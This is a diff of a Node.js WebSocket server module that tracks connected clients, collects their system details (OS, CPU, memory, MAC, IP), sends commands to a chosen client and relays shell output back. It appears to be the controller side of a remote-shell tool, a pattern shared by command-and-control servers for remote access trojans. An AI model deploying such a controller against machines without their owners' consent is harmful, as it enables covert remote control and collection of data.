@@ -1,185 +1,122 @@
 import { WebSocketServer } from "ws";
 import Logger from "./logger.js";
+import { EventEmitter } from "events";
 import crypto from "crypto";
-// import colors from "colors";
 
-class WSServer {
-  constructor(httpServer) {
-    this.httpServer = httpServer;
-    this.wss = null;
-    this.clients = new Map();
-  }
+class WSServer extends EventEmitter {
+	constructor(httpServer) {
+		super();
+		this.wss = new WebSocketServer({ server: httpServer });
+		this.clients = new Map();
+	}
 
-  generateShortId() {
-    return crypto.randomBytes(2).toString('hex').toUpperCase();
-  }
+	start() {
+		this.wss.on("connection", this.handleConnection.bind(this));
+		Logger.info("WebSocket server started");
+	}
 
-  start() {
-    this.wss = new WebSocketServer({ server: this.httpServer.getServer() });
-    this.setupEventHandlers();
-    Logger.success(`Secure WebSocket server initialized and attached to HTTP server`);
-  }
+	handleConnection(ws) {
+		ws.on("message", (data) => this.handleMessage(ws, data));
+		ws.on("close", () => this.handleDisconnect(ws));
+		Logger.info("New client connected");
+	}
 
-  setupEventHandlers() {
-    this.wss.on("connection", (ws, req) => this.handleConnection(ws, req));
-  }
+	handleMessage(ws, data) {
+		try {
+			const message = JSON.parse(data);
+			
+			switch (message.type) {
+				case "identify":
+					this.handleIdentify(ws, message);
+					break;
+				case "shell_output":
+					this.handleShellOutput(ws, message);
+					break;
+				case "shell_exit":
+					this.handleShellExit(ws);
+					break;
+			}
+		} catch (error) {
+			Logger.error(`Failed to handle message: ${error.message}`);
+		}
+	}
 
-  handleConnection(ws, req) {
-    const ip = req.socket.remoteAddress;
-    const shortId = this.generateShortId();
-    this.clients.set(ws, { 
-      id: "unknown", 
-      shortId,
-      ip,
-      connectedAt: new Date(),
-      systemInfo: null
-    });
-    Logger.info(`New client session established from ${ip} (Session ID: ${shortId})`);
-    this.setupClientHandlers(ws);
-  }
+	handleIdentify(ws, data) {
+		const shortId = crypto.randomBytes(2).toString('hex').toUpperCase();
+		const clientInfo = {
+			id: data.id,
+			shortId,
+			...data.systemInfo,
+			ws
+		};
+		
+		this.clients.set(ws, clientInfo);
+		Logger.info(`Client identified: ${clientInfo.id} (${shortId})`);
+	}
 
-  setupClientHandlers(ws) {
-    ws.on("message", (message) => this.handleMessage(ws, message));
-    ws.on("close", () => this.handleClose(ws));
-    ws.on("error", (error) => this.handleError(error));
-  }
+	handleShellOutput(ws, data) {
+		const clientInfo = this.clients.get(ws);
+		if (!clientInfo) return;
 
-  handleMessage(ws, message) {
-    try {
-      const data = JSON.parse(message.toString());
-      Logger.info(`Received message type: ${data.type}`);
-      
-      switch (data.type) {
-        case "identify":
-          this.handleIdentify(ws, data);
-          break;
-        case "shell_response":
-          this.handleShellResponse(ws, data);
-          break;
-        default:
-          Logger.info(`Broadcasting message: ${message}`);
-          this.broadcast(message);
-      }
-    } catch (e) {
-      Logger.info(`Received malformed message payload`);
-    }
-  }
+		this.emit("shell_output", clientInfo.id, data.data);
+	}
 
-  handleIdentify(ws, data) {
-    const clientInfo = this.clients.get(ws);
-    const { id, systemInfo } = data;
-    
-    if (!id) return;
+	handleShellExit(ws) {
+		const clientInfo = this.clients.get(ws);
+		if (!clientInfo) return;
 
-    this.clients.set(ws, { 
-      ...clientInfo,
-      id,
-      systemInfo: systemInfo || null
-    });
+		this.emit("shell_exit", clientInfo.id);
+	}
 
-    const details = systemInfo ? 
-      ` (${systemInfo.os}, ${systemInfo.arch}, ${systemInfo.platform})` : 
-      '';
+	handleDisconnect(ws) {
+		const clientInfo = this.clients.get(ws);
+		if (clientInfo) {
+			Logger.info(`Client disconnected: ${clientInfo.id} (${clientInfo.shortId})`);
+			this.clients.delete(ws);
+		}
+	}
 
-    Logger.success(`Client "${id}" (${clientInfo.shortId}) authenticated from ${clientInfo.ip}${details}`);
-  }
+	broadcast(message) {
+		this.clients.forEach((clientInfo) => {
+			if (clientInfo.ws.readyState === 1) {
+				clientInfo.ws.send(JSON.stringify({
+					type: "message",
+					data: message
+				}));
+			}
+		});
+	}
 
-  handleShellResponse(ws, data) {
-    const clientInfo = this.clients.get(ws);
-    if (!clientInfo) return;
+	sendToClient(clientId, data) {
+		for (const [ws, client] of this.clients.entries()) {
+			if (client.id === clientId || client.shortId === clientId) {
+				if (ws.readyState === 1) {
+					ws.send(JSON.stringify(data));
+					return true;
+				}
+			}
+		}
+		return false;
+	}
 
-    const colors = {
-      reset: "\x1b[0m",
-      blue: "\x1b[34m",
-      cyan: "\x1b[36m",
-      yellow: "\x1b[33m",
-      green: "\x1b[32m",
-      red: "\x1b[31m"
-    };
+	getClients() {
+		return Array.from(this.clients.values());
+	}
 
-    console.log(`\n${colors.blue}Command Execution Results:${colors.reset}\n`);
-    console.log(`${colors.yellow}Client:${colors.reset} ${clientInfo.shortId} (${clientInfo.id})`);
-    console.log(`${colors.yellow}Status:${colors.reset} ${data.success ? colors.green + "Success" + colors.reset : colors.red + "Failed" + colors.reset}`);
-    
-    if (data.error) {
-      console.log(`\n${colors.red}Error:${colors.reset}`);
-      console.log(data.error);
-    }
-
-    if (data.output) {
-      console.log(`\n${colors.cyan}Output:${colors.reset}`);
-      console.log(data.output);
-    }
-    
-    console.log(""); // Empty line for readability
-    process.stdout.write(`${colors.yellow}[${clientInfo.shortId}]${colors.reset}> `); // Display the client-specific prompt
-  }
-
-  handleClose(ws) {
-    const clientInfo = this.clients.get(ws);
-    Logger.warn(`Client session "${clientInfo.id}" (${clientInfo.shortId}) terminated from ${clientInfo.ip}`);
-    this.clients.delete(ws);
-  }
-
-  handleError(error) {
-    Logger.error(`Security protocol violation detected: ${error.message}`);
-  }
-
-  broadcast(message) {
-    this.clients.forEach((clientInfo, client) => {
-      if (client.readyState === WebSocket.OPEN) {
-        client.send(message);
-      }
-    });
-  }
-
-  sendToClient(targetId, data) {
-    console.log("[>] Attempting to send to client:", targetId);
-    console.log("[>] Data:", data);
-    
-    for (const [ws, info] of this.clients.entries()) {
-      if ((info.id === targetId || info.shortId === targetId) && ws.readyState === WebSocket.OPEN) {
-        const messageStr = JSON.stringify(data);
-        console.log("[>] Sending message:", messageStr);
-        ws.send(messageStr);
-        return true;
-      }
-    }
-    console.log("[!] Client not found or not connected:", targetId);
-    return false;
-  }
-
-  getWSS() {
-    return this.wss;
-  }
-
-  getClients() {
-    return Array.from(this.clients.entries()).map(([ws, info]) => ({
-      id: info.id,
-      shortId: info.shortId,
-      ip: info.ip,
-      connectedAt: info.connectedAt,
-      systemInfo: info.systemInfo
-    }));
-  }
-
-  getClientDetails() {
-    return this.getClients().map(client => {
-      const sysInfo = client.systemInfo || {};
-      return {
-        id: client.id,
-        shortId: client.shortId,
-        ip: client.ip,
-        connectedAt: client.connectedAt.toISOString(),
-        os: sysInfo.os || 'Unknown',
-        platform: sysInfo.platform || 'Unknown',
-        arch: sysInfo.arch || 'Unknown',
-        memory: sysInfo.memory || 'Unknown',
-        cpu: sysInfo.cpu || 'Unknown',
-        mac: sysInfo.mac || 'Unknown'
-      };
-    });
-  }
+	getClientDetails() {
+		return this.getClients().map(({ id, shortId, ip, mac, os, platform, arch, memory, cpu, connectedAt }) => ({
+			id,
+			shortId,
+			ip: ip || "unknown",
+			mac: mac || "unknown",
+			os: os || "unknown",
+			platform: platform || "unknown",
+			arch: arch || "unknown",
+			memory: memory || "unknown",
+			cpu: cpu || "unknown",
+			connectedAt: connectedAt || new Date().toISOString()
+		}));
+	}
 }
 
 export default WSServer;
